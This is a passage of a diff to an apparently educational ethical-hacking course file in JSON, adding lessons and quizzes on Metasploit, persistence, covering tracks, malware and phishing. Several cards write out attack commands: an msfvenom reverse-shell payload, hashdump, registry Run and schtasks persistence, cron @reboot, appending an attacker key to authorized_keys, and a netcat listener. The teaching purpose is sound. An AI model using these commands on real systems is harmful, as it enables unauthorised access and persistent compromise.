-              "body": "Disable Windows Firewall temporarily (lab-only setting) so scans aren't blocked. Turn off Automatic Updates to keep a known, testable vulnerability set. Note the machine's IP with 'ipconfig'. Create a simple local user account with a weak password for authentication exercises. Take a snapshot immediately so the vulnerable state can always be restored. These settings are intentionally weak for learning — never replicate them outside an isolated lab."
+              "id": "u9_m2_l2",
+              "title": "msfconsole & Meterpreter Commands",
+              "cards": [
+                {
+                  "id": "u9_m2_l2_c1",
+                  "title": "msfconsole Essentials",
+                  "body": "'search type:exploit platform:windows smb' searches for matching exploit modules. 'use exploit/windows/smb/ms17_010_eternalblue' selects a specific module. 'show options' lists all configurable options for the selected module. 'set RHOSTS 192.168.1.20' sets the target host. 'info' displays detailed information about the current module."
+                },
+                {
+                  "id": "u9_m2_l2_c2",
+                  "title": "Meterpreter Commands & Post-Exploitation Workflow",
+                  "body": "'sysinfo' displays basic target system info. 'getuid' shows the current privilege context. 'ps' lists running processes (for migration). 'screenshot' captures the target's desktop. 'hashdump' dumps password hashes for offline cracking. Typical workflow: sysinfo → getuid → ps/migrate → hashdump → download/upload files."
+                }
+              ],
+              "quiz": {
+                "question": "Which Meterpreter command would you run to extract password hashes for later offline cracking?",
+                "options": [
+                  "sysinfo",
+                  "screenshot",
+                  "hashdump",
+                  "getuid"
+                ],
+                "correct_index": 2,
+                "explanation": "'hashdump' extracts password hashes stored on the compromised target, which can then be cracked offline with tools like John the Ripper or Hashcat."
+              }
+            },
+            {
+              "id": "u9_m2_l3",
+              "title": "msfvenom, Resource Scripts & Armitage",
+              "cards": [
+                {
+                  "id": "u9_m2_l3_c1",
+                  "title": "msfvenom — Generating Custom Payloads",
+                  "body": "msfvenom generates standalone payloads. 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe' generates a Windows reverse-shell executable. Similar commands generate Linux ELF binaries or PHP web-shells by changing the payload and format flags."
+                },
+                {
+                  "id": "u9_m2_l3_c2",
+                  "title": "Resource Scripts & Armitage",
+                  "body": "Resource scripts (.rc files) contain a sequence of msfconsole commands to run automatically — launch with 'msfconsole -r myscript.rc' to replay an entire exploitation sequence instantly, useful for repeatable lab exercises. Armitage is a graphical front-end for Metasploit that visualises targets and available attacks as icons, useful for teaching, though most professionals still work primarily in msfconsole."
+                }
+              ],
+              "quiz": {
+                "question": "What is the purpose of an msfconsole resource script (.rc file)?",
+                "options": [
+                  "To store captured passwords",
+                  "To replay a sequence of msfconsole commands automatically, standardising a repeatable workflow",
+                  "To encrypt Meterpreter traffic",
+                  "To generate wordlists"
+                ],
+                "correct_index": 1,
+                "explanation": "Resource scripts turn a manual, multi-step process into a single, repeatable, auditable command sequence — useful for demos and consistent testing."
+              }
+            },
+            {
+              "id": "u9_m2_l4",
+              "title": "Real-World Exploits & Other Tools",
+              "cards": [
+                {
+                  "id": "u9_m2_l4_c1",
+                  "title": "EternalBlue & Privilege Escalation",
+                  "body": "EternalBlue (MS17-010) was a famous Windows SMB vulnerability exploited in the 2017 WannaCry ransomware outbreak, allowing remote code execution without user interaction. Once initial access is gained, attackers often only have limited privileges — Privilege Escalation is the process of gaining higher-level access. Vertical escalation moves from low to high privilege; horizontal escalation gains access to another account at the same privilege level."
+                },
+                {
+                  "id": "u9_m2_l4_c2",
+                  "title": "SQLmap, BeEF, Searchsploit & Netcat",
+                  "body": "SQLmap automates detecting and exploiting SQL injection: 'sqlmap -u \"http://target/page?id=1\" --dbs' lists databases once injection is confirmed. BeEF (Browser Exploitation Framework) exploits web browsers via a 'hooked' JavaScript payload after an XSS flaw. Searchsploit searches a local Exploit-DB copy: 'searchsploit apache 2.4'. Netcat creates reverse/bind shells: 'nc -lvnp 4444' listens for an incoming connection."
+                }
+              ],
+              "quiz": {
+                "question": "What made EternalBlue (MS17-010) especially dangerous?",
+                "options": [
+                  "It required the victim to open a phishing email",
+                  "It allowed remote code execution on unpatched Windows systems without any user interaction",
+                  "It only worked on Linux servers",
+                  "It was never actually exploited in the wild"
+                ],
+                "correct_index": 1,
+                "explanation": "EternalBlue allowed attackers to remotely execute code on vulnerable, unpatched Windows systems with zero user interaction required, which is why it spread so devastatingly fast in the WannaCry outbreak."
+              }
             }
-          ],
-          "quiz": {
-            "question": "Why is the Windows Firewall temporarily disabled on the Windows 7 target VM?",
-            "options": [
-              "To make the VM boot faster",
-              "So scans and exploits from the lab exercises aren't blocked",
-              "It's required by Windows 7 licensing",
-              "To save disk space"
-            ],
-            "correct_index": 1,
-            "explanation": "This is a lab-only setting that lets cadets practice scanning and exploitation without the firewall interfering — never used outside an isolated lab."
-          }
+          ]
         },
         {
-          "id": "u7_m3_l3",
-          "title": "Metasploitable2",
-          "cards": [
+          "id": "u9_m3",
+          "title": "Maintaining Access: Backdoors & Persistence",
+          "description": "How attackers ensure access survives reboots and time — and how defenders detect it.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m3_l3_c1",
-              "title": "What & Why",
-              "body": "Metasploitable2 is an intentionally vulnerable Linux virtual machine, built by Rapid7 for security training. It ships pre-loaded with outdated, exploitable services like FTP, Samba, MySQL, and Tomcat. It is designed specifically to be scanned and exploited — a completely legal target within your own lab, and a perfect companion to Metasploit since most of its vulnerabilities have a matching module. Never expose it to a real network or the internet."
+              "id": "u9_m3_l1",
+              "title": "Backdoors & Why Attackers Persist",
+              "cards": [
+                {
+                  "id": "u9_m3_l1_c1",
+                  "title": "What is Maintaining Access?",
+                  "body": "The fourth phase of ethical hacking — ensuring continued access to a compromised system over time. Without persistence, access could be lost the moment the system reboots or a session drops. Re-exploiting a vulnerability every time is slow, noisy, and may not always work again — persistence enables longer-term objectives like data exfiltration, espionage, or ransomware deployment. Advanced Persistent Threats (APTs) rely heavily on long-term persistence."
+                },
+                {
+                  "id": "u9_m3_l1_c2",
+                  "title": "Types of Backdoors",
+                  "body": "A backdoor is a hidden method of bypassing normal authentication. Software Backdoor: a hidden program or modified application providing covert remote access. Web Shell: a malicious script uploaded to a web server, providing command execution via a browser. Hardware Backdoor: a physical device or firmware modification. Account Backdoor: a hidden or additional user account created for repeated authorised-looking access."
+                }
+              ],
+              "quiz": {
+                "question": "Why do attackers seek persistence rather than just re-exploiting a vulnerability each time?",
+                "options": [
+                  "Re-exploitation is illegal but persistence is legal",
+                  "Re-exploiting is slow, noisy, and may not always work again — persistence enables continued access without repeating the entire attack",
+                  "Persistence is required by the vulnerability itself",
+                  "There is no advantage to persistence"
+                ],
+                "correct_index": 1,
+                "explanation": "Persistence lets an attacker skip the risky, noisy re-exploitation step and instead maintain reliable ongoing access for longer-term objectives."
+              }
             },
             {
-              "id": "u7_m3_l3_c2",
-              "title": "Downloading, Importing & First Login",
-              "body": "Get the Metasploitable2 zip from SourceForge/Rapid7's mirror, extract it to reveal the .vmdk disk file, create a new VM (Linux, Other Linux 2.6.x kernel, 512MB RAM is sufficient), attach the .vmdk as the hard disk, and set the network to Bridged. Default login is msfadmin/msfadmin. Run 'ifconfig' to note its IP. Never run 'apt update' or patch this machine — doing so removes the intentional vulnerabilities. Take a snapshot immediately so the vulnerable baseline can always be restored."
+              "id": "u9_m3_l2",
+              "title": "Persistence Techniques",
+              "cards": [
+                {
+                  "id": "u9_m3_l2_c1",
+                  "title": "Common Persistence Techniques",
+                  "body": "Startup/Registry Entries: adds a program to run automatically at boot (Windows Run keys). Scheduled Tasks/Cron Jobs: configures the OS to periodically re-launch malicious code. Malicious Services: installs a disguised service running continuously in the background. SSH Key Injection: adds an attacker's SSH key to authorized_keys for passwordless remote access."
+                },
+                {
+                  "id": "u9_m3_l2_c2",
+                  "title": "Concrete Persistence Commands",
+                  "body": "Windows: 'reg add HKCU\\...\\Run /v Update /t REG_SZ /d C:\\payload.exe' adds a registry Run key; 'schtasks /create /tn Update /tr payload.exe /sc onlogon' creates a scheduled task at logon. Linux: 'crontab -e' with '@reboot /path/payload.sh' runs a script every reboot; 'echo \"attacker_key\" >> ~/.ssh/authorized_keys' adds a passwordless SSH key; 'systemctl enable malicious.service' registers a disguised auto-starting service."
+                }
+              ],
+              "quiz": {
+                "question": "Which Linux persistence technique allows an attacker passwordless remote login?",
+                "options": [
+                  "Editing /etc/hostname",
+                  "Adding the attacker's public key to ~/.ssh/authorized_keys",
+                  "Running 'ls -la'",
+                  "Installing a browser extension"
+                ],
+                "correct_index": 1,
+                "explanation": "Appending an attacker's SSH public key to authorized_keys grants them passwordless SSH access to the system from then on."
+              }
+            },
+            {
+              "id": "u9_m3_l3",
+              "title": "Rootkits, C2 & Advanced Persistence Tools",
+              "cards": [
+                {
+                  "id": "u9_m3_l3_c1",
+                  "title": "Rootkits & Command and Control",
+                  "body": "Rootkits are stealthy malware hiding deep within the operating system, actively concealing the attacker's presence — hiding files, processes, network connections, and even other persistence mechanisms. Kernel-level rootkits operate below where most security tools look. A Command & Control (C2) channel lets an attacker remotely control a compromised system; compromised machines periodically 'call home' to a C2 server, and modern C2 traffic often disguises itself as normal web traffic."
+                },
+                {
+                  "id": "u9_m3_l3_c2",
+                  "title": "Netcat, Weevely & Post-Exploitation Frameworks",
+                  "body": "A simple netcat listener combined with a scheduled task creates a basic persistent backdoor, though it's easy to detect once known. Weevely generates a stealthy, obfuscated PHP web shell communicating over standard HTTP requests. Post-exploitation frameworks like PowerShell Empire, Covenant, and Sliver offer more advanced, disguised persistence and C2 capabilities — Cobalt Strike is the commercial, professional-grade option widely used in red teaming."
+                }
+              ],
+              "quiz": {
+                "question": "What is the main purpose of a Command & Control (C2) channel?",
+                "options": [
+                  "To encrypt files for ransom",
+                  "To let an attacker remotely direct a compromised system after it 'calls home'",
+                  "To scan for open ports",
+                  "To perform a WHOIS lookup"
+                ],
+                "correct_index": 1,
+                "explanation": "A C2 channel is the attacker's remote control mechanism, letting them issue new instructions to compromised machines that periodically check in."
+              }
+            },
+            {
+              "id": "u9_m3_l4",
+              "title": "Detecting Persistence & Ethics",
+              "cards": [
+                {
+                  "id": "u9_m3_l4_c1",
+                  "title": "Detecting Persistence & Backdoors",
+                  "body": "Defenders should regularly audit startup entries, scheduled tasks, and running services for anything unfamiliar. Tools include Autoruns (Sysinternals) which lists every program configured to start automatically on Windows, chkrootkit/rkhunter which scan Linux systems for known rootkit signatures, and network monitoring (Wireshark) to identify unusual outbound connections indicating possible C2 traffic. File Integrity Monitoring and EDR tools also help catch what simple antivirus signatures miss."
+                },
+                {
+                  "id": "u9_m3_l4_c2",
+                  "title": "Maintaining Access — Ethical Boundaries",
+                  "body": "Installing any backdoor or persistence mechanism requires explicit, written authorisation. Authorised tests must document every persistence mechanism installed, for complete removal afterward. Leaving any backdoor in place after a test concludes is a serious professional and legal violation. Professional reports always include full remediation steps for anything installed during testing."
+                }
+              ],
+              "quiz": {
+                "question": "What must a penetration tester do with any backdoor or persistence mechanism installed during an authorised test?",
+                "options": [
+                  "Leave it in place for future re-testing",
+                  "Fully document it and remove it after the test concludes",
+                  "Sell it to the highest bidder",
+                  "Nothing — it's not their responsibility"
+                ],
+                "correct_index": 1,
+                "explanation": "Leaving any installed backdoor in place after a test is a serious legal and professional violation — everything must be documented and removed."
+              }
             }
-          ],
-          "quiz": {
-            "question": "Why should you never run 'apt update' on Metasploitable2?",
-            "options": [
-              "It would use too much bandwidth",
-              "It would remove the intentional vulnerabilities the machine is built to have",
-              "The machine has no internet access",
-              "It requires a different package manager"
-            ],
-            "correct_index": 1,
-            "explanation": "Metasploitable2 is deliberately kept vulnerable and outdated for training purposes — patching it would defeat its entire purpose."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u7_m4",
-      "title": "Bridged Networking & Lab Connectivity",
-      "description": "Connecting every lab machine on one subnet and verifying it actually works.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u7_m4_l1",
-          "title": "Understanding Bridged Networking",
-          "cards": [
-            {
-              "id": "u7_m4_l1_c1",
-              "title": "Bridged Networking Explained",
-              "body": "A bridged adapter makes the VM appear as a separate physical device on your existing LAN. The VM requests its own IP address from the same DHCP server (usually your router) as your laptop. All bridged VMs — Kali, Windows 7, Metasploitable2 — can reach each other exactly like real machines on a network. Because it touches the real LAN, only use bridged mode on a private, trusted network, never on a public one."
-            },
-            {
-              "id": "u7_m4_l1_c2",
-              "title": "Configuring Bridged Network — All Three VMs",
-              "body": "For each VM (Kali, Windows 7, Metasploitable2): open Settings → Network Adapter, change the mode from NAT to Bridged, choose your active host network card (Wi-Fi or Ethernet) as the bridge source, power on all VMs together so they request IPs, then confirm each machine received an IP in the same subnet as your host (e.g. 192.168.1.x)."
-            },
-            {
-              "id": "u7_m4_l1_c3",
-              "title": "IP Addressing Plan for the Bridged Lab",
-              "body": "Example addressing on a typical home/lab subnet 192.168.1.0/24: Host Machine (runs the hypervisor) at 192.168.1.10, Kali Linux VM (attacker) at 192.168.1.101, Windows 7 VM (target #1) at 192.168.1.102, Metasploitable2 VM (target #2, vulnerable) at 192.168.1.103, and Raspberry Pi (physical device) at 192.168.1.104."
-            }
-          ],
-          "quiz": {
-            "question": "In Bridged mode, where does a VM get its IP address from?",
-            "options": [
-              "The VM always uses 127.0.0.1",
-              "The same DHCP server (usually your router) as your physical laptop",
-              "It never gets an IP address",
-              "Only from the hypervisor software itself"
-            ],
-            "correct_index": 1,
-            "explanation": "A bridged VM behaves like a separate physical device on the LAN, requesting its own IP from the same DHCP server as the host machine."
-          }
+          ]
         },
         {
-          "id": "u7_m4_l2",
-          "title": "Verifying the Lab Network",
-          "cards": [
+          "id": "u9_m4",
+          "title": "Covering Tracks",
+          "description": "The final phase — how attackers erase evidence, and why logging must be tamper-resistant.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m4_l2_c1",
-              "title": "Ping Test Between All VMs",
-              "body": "Run these from a terminal/Command Prompt on each machine to confirm the bridged network is working end-to-end: from Kali, 'ping 192.168.1.102' confirms Kali can reach Windows 7, and 'ping 192.168.1.103' confirms it can reach Metasploitable2. From Windows 7, 'ping 192.168.1.101' confirms it can reach Kali. The host should also be able to ping every VM."
+              "id": "u9_m4_l1",
+              "title": "What is Covering Tracks?",
+              "cards": [
+                {
+                  "id": "u9_m4_l1_c1",
+                  "title": "The Final Phase",
+                  "body": "Covering Tracks is the fifth and final phase of the ethical hacking lifecycle — erasing evidence of an intrusion. Attackers attempt to remove or alter logs, files, and other traces of their activity, with the goal of avoiding detection and making forensic investigation as difficult as possible. This directly opposes the Integrity and Non-Repudiation principles — this is where they're tested."
+                },
+                {
+                  "id": "u9_m4_l1_c2",
+                  "title": "Why Attackers Cover Their Tracks",
+                  "body": "Extends the duration of undetected access, maximising time for the attacker's objectives. Makes incident response and forensic investigation slower and less conclusive. Can obscure the true scope of a breach, and complicates attribution — making it harder to identify who was responsible. A hallmark of sophisticated, patient attackers rather than opportunistic ones."
+                }
+              ],
+              "quiz": {
+                "question": "Which security principles does Covering Tracks most directly attack?",
+                "options": [
+                  "Availability and Confidentiality",
+                  "Integrity and Non-Repudiation",
+                  "Authentication and Authorization",
+                  "None — it doesn't relate to any security principle"
+                ],
+                "correct_index": 1,
+                "explanation": "Covering Tracks attempts to falsify or erase logs, which directly undermines Integrity (data being accurate/untampered) and Non-Repudiation (proving what actually happened)."
+              }
             },
             {
-              "id": "u7_m4_l2_c2",
-              "title": "Verifying Interfaces on Each VM",
-              "body": "On Kali/Metasploitable2 (Linux), run 'ip a' or 'ifconfig' to list interfaces and confirm the assigned IP. On Windows 7, run 'ipconfig /all' to see the IPv4 address and adapter status. Confirm the subnet mask and gateway match your host's network. If a VM shows an APIPA address (169.254.x.x), the bridged adapter failed to reach DHCP — recheck the adapter setting."
+              "id": "u9_m4_l2",
+              "title": "Log Clearing & Hiding Activities",
+              "cards": [
+                {
+                  "id": "u9_m4_l2_c1",
+                  "title": "Log Clearing Techniques",
+                  "body": "Log clearing involves deleting or modifying system logs to remove evidence. It can target application, system event, authentication, or firewall logs. Complete log deletion is often itself a red flag — investigators notice suspicious gaps. Techniques: Event Log Clearing (deleting Windows Event Viewer or Linux syslog entries), Selective Log Editing (removing only specific entries), Timestomping (altering file timestamps), and Log Rotation Abuse (forcing premature log rotation to push old evidence out of retention)."
+                },
+                {
+                  "id": "u9_m4_l2_c2",
+                  "title": "Hiding Activities",
+                  "body": "Beyond clearing logs, attackers try to hide malicious files and processes themselves, often combined with rootkit techniques. Techniques: Hidden Files/Directories (using OS features like dot-files or the hidden attribute), Alternate Data Streams (hiding data within an NTFS file's alternate stream), Steganography (concealing data within an innocent-looking image), and Process Masquerading (naming malicious processes to resemble legitimate ones)."
+                }
+              ],
+              "quiz": {
+                "question": "Why is a completely empty log file often MORE suspicious to investigators than a normal one?",
+                "options": [
+                  "Empty logs are always a sign of good security",
+                  "A total absence of expected log entries is itself a red flag indicating deliberate tampering",
+                  "Investigators never check log files",
+                  "Empty logs mean the system was never used"
+                ],
+                "correct_index": 1,
+                "explanation": "Because logs are expected to contain routine activity, a complete gap or empty file stands out as unusual and often prompts closer investigation."
+              }
             },
             {
-              "id": "u7_m4_l2_c3",
-              "title": "Scanning the Lab with Nmap",
-              "body": "From Kali: 'nmap -sn 192.168.1.0/24' ping-sweeps the subnet to discover every live host. 'nmap -sV 192.168.1.102' scans the Windows 7 VM for open ports and service versions. 'nmap -sV 192.168.1.103' scans Metasploitable2, revealing its many deliberately open, outdated services. 'nmap -A 192.168.1.103' runs an aggressive scan with OS detection, scripts, and traceroute. Save results with '-oN scan.txt' for later review."
+              "id": "u9_m4_l3",
+              "title": "Anti-Forensics & Defence",
+              "cards": [
+                {
+                  "id": "u9_m4_l3_c1",
+                  "title": "Anti-Forensics & Protecting Logs",
+                  "body": "Anti-forensics refers to any technique designed to obstruct or mislead a forensic investigation — including log clearing, hiding activity, timestomping, encryption of malicious artifacts, and even planting misleading evidence. Defence: audit logs should be centralised, tamper-evident, and separate from the systems they monitor. Sending logs to a remote, write-restricted SIEM prevents an attacker from editing them locally — 'if logs live only on the compromised system, they were never truly safe to begin with.'"
+                },
+                {
+                  "id": "u9_m4_l3_c2",
+                  "title": "Covering Tracks — Ethical Boundaries",
+                  "body": "Real log tampering, even during an authorised test, requires very explicit prior agreement. Most engagements explicitly PROHIBIT actual log clearing to preserve the client's own audit trail — testers instead document what COULD have been hidden, without actually destroying real evidence. Understanding this phase is about recognition and defence, not about actually erasing anything."
+                }
+              ],
+              "quiz": {
+                "question": "Why does sending logs to a remote, centralised SIEM defend against Covering Tracks?",
+                "options": [
+                  "It makes logs load faster",
+                  "An attacker who compromises the local system can't edit logs that already live elsewhere and are write-restricted",
+                  "SIEMs automatically delete old logs",
+                  "It has no defensive value"
+                ],
+                "correct_index": 1,
+                "explanation": "If logs are immediately shipped off to a separate, write-restricted system, an attacker who compromises the local machine can no longer tamper with the evidence already stored elsewhere."
+              }
             }
-          ],
-          "quiz": {
-            "question": "What does it mean if a VM shows an IP address starting with 169.254.x.x?",
-            "options": [
-              "The VM has successfully connected to the internet",
-              "The bridged adapter failed to reach DHCP",
-              "The VM is running in Host-Only mode correctly",
-              "The VM has a static IP configured"
-            ],
-            "correct_index": 1,
-            "explanation": "A 169.254.x.x (APIPA) address means the VM couldn't reach a DHCP server, indicating a bridged adapter misconfiguration."
-          }
+          ]
         },
         {
-          "id": "u7_m4_l3",
-          "title": "Lab Topology & Snapshots",
-          "cards": [
+          "id": "u9_m5",
+          "title": "Malware & Social Engineering",
+          "description": "The software and human techniques that run through every phase of a real attack.",
+          "is_pro": false,
+          "lessons": [
             {
-              "id": "u7_m4_l3_c1",
-              "title": "Bridged Lab Topology",
-              "body": "All bridged machines connect through the physical router/switch on one LAN with a shared DHCP pool (e.g. 192.168.1.0/24). The Host Machine runs VMware/VirtualBox, the Kali Linux VM is the attacker, and the Windows 7 and Metasploitable2 VMs are the targets. All machines share one subnet — Kali can directly scan and exploit both target VMs, exactly like real hardware on a LAN."
+              "id": "u9_m5_l1",
+              "title": "Malware Across the Attack Lifecycle",
+              "cards": [
+                {
+                  "id": "u9_m5_l1_c1",
+                  "title": "Malware's Role in Every Phase",
+                  "body": "Malware can deliver the exploit (Gaining Access), provide the backdoor (Maintaining Access), or hide itself (Covering Tracks). Malware types map to lifecycle roles: Trojan (often delivers the initial payload), Rootkit (provides stealth during Maintaining Access/Covering Tracks), Ransomware (the final-stage payload, often the ultimate objective), Spyware (gathers information continuously), and Botnet Malware (enables C2 across many devices at once)."
+                },
+                {
+                  "id": "u9_m5_l1_c2",
+                  "title": "How Malware Spreads",
+                  "body": "Email attachments and malicious links remain the most common infection vector. Other vectors: infected removable media (USB drives), drive-by downloads from compromised websites, bundling with pirated or 'free' software, and directly exploiting unpatched vulnerabilities without any user interaction at all. Most malware still needs a human action to begin — which is exactly why awareness matters."
+                }
+              ],
+              "quiz": {
+                "question": "What remains the most common infection vector for malware?",
+                "options": [
+                  "Physical hardware failure",
+                  "Email attachments and malicious links",
+                  "Weather events",
+                  "Government intervention"
+                ],
+                "correct_index": 1,
+                "explanation": "Despite advances in technical defences, email attachments and malicious links remain the single most common way malware initially spreads."
+              }
             },
             {
-              "id": "u7_m4_l3_c2",
-              "title": "Snapshotting Your Lab",
-              "body": "Take a snapshot of every VM once the bridged network is confirmed working — this is your clean baseline. Name snapshots clearly, e.g. 'Clean-Bridged-Verified'. Snapshot again before any exploitation attempt that could crash or corrupt a target machine. Reverting a snapshot takes seconds and instantly undoes any damage. A disciplined snapshot habit is what makes repeated, safe experimentation possible."
-            }
-          ],
-          "quiz": {
-            "question": "When should you take a fresh snapshot of a lab VM?",
-            "options": [
-              "Only once, when the VM is first created",
-              "After confirming the bridged network works, and again before any risky exploitation attempt",
-              "Only after the VM has already crashed",
-              "Snapshots are unnecessary if you have backups"
-            ],
-            "correct_index": 1,
-            "explanation": "A clean baseline snapshot plus a fresh one before any risky action lets you instantly revert any damage from a failed exercise."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u7_m5",
-      "title": "Metasploit Framework",
-      "description": "Setting up and using the industry-standard exploitation framework.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u7_m5_l1",
-          "title": "Getting Started with Metasploit",
-          "cards": [
-            {
-              "id": "u7_m5_l1_c1",
-              "title": "Metasploit Framework Overview",
-              "body": "Metasploit is the industry-standard framework for developing and executing exploit code. It comes pre-installed on Kali Linux with thousands of ready-to-use exploit and auxiliary modules. 'msfconsole' is the primary command-line interface used to search, configure, and launch modules, backed by a PostgreSQL database that stores hosts, scan results, credentials, and session data."
+              "id": "u9_m5_l2",
+              "title": "Malware Analysis & Awareness",
+              "cards": [
+                {
+                  "id": "u9_m5_l2_c1",
+                  "title": "Static vs Dynamic Analysis",
+                  "body": "Static Analysis examines the malware's code/file without ever running it — safe, but can miss behaviour only visible at runtime. Dynamic Analysis runs the malware in an isolated 'sandbox' environment and observes its behaviour — more insightful, but requires strict isolation to stay safe."
+                },
+                {
+                  "id": "u9_m5_l2_c2",
+                  "title": "Signs of Infection & Ransomware",
+                  "body": "Warning signs: unusually slow performance or frequent crashes, programs opening/installing without your action, unfamiliar processes or a spike in outbound network activity, antivirus being unexpectedly disabled, and files becoming encrypted or inaccessible without explanation. Ransomware is typically the FINAL payload after all earlier phases have already occurred — modern ransomware often steals data first ('double extortion') before encrypting it. Reliable recovery without payment requires strong, offline backups."
+                }
+              ],
+              "quiz": {
+                "question": "By the time ransomware activates and encrypts files, what has usually already happened?",
+                "options": [
+                  "Nothing — ransomware is always the very first step of an attack",
+                  "The attacker has typically already completed all five phases of the attack lifecycle",
+                  "The victim has already paid the ransom",
+                  "The malware has been fully removed"
+                ],
+                "correct_index": 1,
+                "explanation": "Ransomware is usually the final, visible payload — by the time it activates, the attacker has typically already gained access, maintained it, and often covered their tracks."
+              }
             },
             {
-              "id": "u7_m5_l1_c2",
-              "title": "Configuring the Metasploit Database",
-              "body": "Setup steps: 'sudo systemctl start postgresql' ensures the database service is running. 'sudo msfdb init' creates the Metasploit database and user credentials. Run 'msfconsole' to open the interface. Inside msfconsole, run 'db_status' to confirm a successful connection. Finally, 'workspace -a lab-day2' creates a workspace to organise this course's findings separately."
-            }
-          ],
-          "quiz": {
-            "question": "What must be running before Metasploit's database features will work?",
-            "options": [
-              "A web browser",
-              "The PostgreSQL service",
-              "A VPN connection",
-              "Windows Defender"
-            ],
-            "correct_index": 1,
-            "explanation": "Metasploit stores hosts, scan results, and session data in a PostgreSQL database, which must be started with 'sudo systemctl start postgresql' before use."
-          }
-        },
-        {
-          "id": "u7_m5_l2",
-          "title": "Using msfconsole",
-          "cards": [
-            {
-              "id": "u7_m5_l2_c1",
-              "title": "Workspace & db_status",
-              "body": "A workspace is an isolated project space inside the Metasploit database for organising one engagement. 'workspace' lists all workspaces; 'workspace -a <name>' creates and switches to a new one. 'db_nmap <target>' runs Nmap and automatically stores the results into the current workspace. 'hosts' and 'services' commands show everything discovered so far in the active workspace."
+              "id": "u9_m5_l3",
+              "title": "Social Engineering Fundamentals",
+              "cards": [
+                {
+                  "id": "u9_m5_l3_c1",
+                  "title": "What is Social Engineering?",
+                  "body": "The art of manipulating people into breaking normal security procedures or revealing information. It exploits human psychology — trust, urgency, fear, curiosity — rather than technical vulnerabilities, and is often the easiest and most reliable way to gain initial access, bypassing technical defences entirely. 'There is no patch for human nature.'"
+                },
+                {
+                  "id": "u9_m5_l3_c2",
+                  "title": "Common Social Engineering Techniques",
+                  "body": "Pretexting: inventing a believable false scenario to extract information (e.g. posing as IT support). Baiting: offering something enticing (free USB, download) that delivers malware when used. Tailgating: physically following an authorised person through a secure door. Quid Pro Quo: offering a fake service or favour in exchange for information or access."
+                }
+              ],
+              "quiz": {
+                "question": "What is 'Tailgating' in social engineering?",
+                "options": [
+                  "Sending a fraudulent email",
+                  "Physically following an authorised person through a secure door without your own access",
+                  "Guessing a password",
+                  "Scanning a network for open ports"
+                ],
+                "correct_index": 1,
+                "explanation": "Tailgating is a physical social engineering technique where an attacker follows someone with legitimate access through a secured entry point."
+              }
             },
             {
-              "id": "u7_m5_l2_c2",
-              "title": "Basic msfconsole Commands",
-              "body": "'search <keyword>' searches all modules for a keyword, e.g. 'search vsftpd'. 'use <module-path>' selects a specific exploit or auxiliary module. 'show options' displays the parameters the module needs (RHOSTS, RPORT, etc.). 'set RHOSTS <ip>' sets the target IP. 'set PAYLOAD <payload>' chooses what code runs after successful exploitation. 'exploit' or 'run' launches the configured module."
-            }
-          ],
-          "quiz": {
-            "question": "Which msfconsole command runs Nmap and automatically saves the results into the current workspace?",
-            "options": [
-              "search",
-              "db_nmap",
-              "show options",
-              "exploit"
-            ],
-            "correct_index": 1,
-            "explanation": "'db_nmap' combines an Nmap scan with automatic storage into Metasploit's database, keeping all reconnaissance organised by workspace."
-          }
-        }
-      ]
-    },
-    {
-      "id": "u7_m6",
-      "title": "Raspberry Pi & Wrapping Up",
-      "description": "Adding a physical device to the lab, then checking, troubleshooting, and closing out safely.",
-      "is_pro": false,
-      "lessons": [
-        {
-          "id": "u7_m6_l1",
-          "title": "Raspberry Pi in the Lab",
-          "cards": [
-            {
-              "id": "u7_m6_l1_c1",
-              "title": "Raspberry Pi Overview",
-              "body": "A low-cost, credit-card-sized single-board computer widely used in security labs. It's useful for building portable pen-testing kits, IoT security testing, and network monitoring devices. It can run Kali Linux ARM edition directly, turning it into a compact attacker platform, and is popular in real-world red-team exercises for covert physical network drops."
+              "id": "u9_m5_l4",
+              "title": "Phishing Deep Dive",
+              "cards": [
+                {
+                  "id": "u9_m5_l4_c1",
+                  "title": "Anatomy of a Phishing Email",
+                  "body": "Phishing combines urgency, authority, and familiarity to bypass a victim's natural caution, and is the single most common initial access technique in real-world breaches. Key elements: Urgency & Fear ('your account will be suspended in 24 hours'), False Authority (impersonating a bank or official), Deceptive Links (display text hiding a different actual URL), and Lookalike Branding (copying real logos and formatting almost perfectly)."
+                },
+                {
+                  "id": "u9_m5_l4_c2",
+                  "title": "Spear Phishing vs Mass Phishing",
+                  "body": "Mass Phishing is sent broadly to thousands of random recipients, generic with often obvious errors, lower success rate per-message but scale compensates. Spear Phishing is carefully targeted at a specific individual or organisation, highly personalised using researched details (OSINT), with a much higher success rate per-message due to credibility — for example, an email referencing your actual manager's name and a real project."
+                }
+              ],
+              "quiz": {
+                "question": "What makes Spear Phishing more dangerous than generic Mass Phishing?",
+                "options": [
+                  "It's sent to more people at once",
+                  "It's highly personalised using researched details, making it far more credible and harder to spot",
+                  "It never contains any links",
+                  "It only targets computers, not people"
+                ],
+                "correct_index": 1,
+                "explanation": "Spear phishing uses researched, personal details (often gathered via OSINT) to make the message far more believable, dramatically increasing its success rate compared to generic mass phishing."
+              }
             },
             {
-              "id": "u7_m6_l1_c2",
-              "title": "Setup & Network Configuration",
-              "body": "Setup: download the Raspberry Pi Imager, flash Kali Linux ARM or Raspberry Pi OS to a microSD card, enable SSH before first boot for headless setup, insert the card and power on, then SSH in from your laptop. Networking: assign a static IP via /etc/dhcpcd.conf, connect to the same bridged/lab network as Kali and Windows 7, change the default password immediately, and verify with 'ssh pi@<static-ip>' from Kali."
+              "id": "u9_m5_l5",
+              "title": "Defense & Building Resilience",
+              "cards": [
+                {
+                  "id": "u9_m5_l5_c1",
+                  "title": "Defending Against Social Engineering",
+                  "body": "Pause before acting on urgency — legitimate requests can withstand a moment of verification. Verify unusual requests through a separate, known communication channel (call, don't reply). Check sender addresses and links carefully — hover before you click. Be cautious about what you share publicly, since it can become ammunition for a targeted attack. Report suspected phishing immediately rather than deleting it silently."
+                },
+                {
+                  "id": "u9_m5_l5_c2",
+                  "title": "Building Resilience — Personal & Organisational",
